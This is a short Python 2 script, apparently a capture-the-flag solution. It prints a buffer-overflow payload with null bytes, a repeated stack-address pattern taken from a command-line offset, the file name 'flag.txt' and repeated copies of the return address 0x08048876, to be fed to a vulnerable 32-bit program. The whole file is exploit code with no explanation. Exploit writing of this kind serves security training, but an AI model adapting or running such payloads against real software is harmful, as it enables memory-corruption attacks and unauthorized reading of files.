import sys
def get_pwn_str(offset):
	return "yes"+ chr(0)*1  + (chr(offset)+chr(0xdb)+chr(0xff)*2)*40 + "\n"+ "flag.txt" +"a" +  chr(0) + "a"*2 + (chr(0x76)+chr(0x88)+chr(0x04)+chr(0x08))*10

if __name__ == '__main__':
	print get_pwn_str(int(sys.argv[1]))

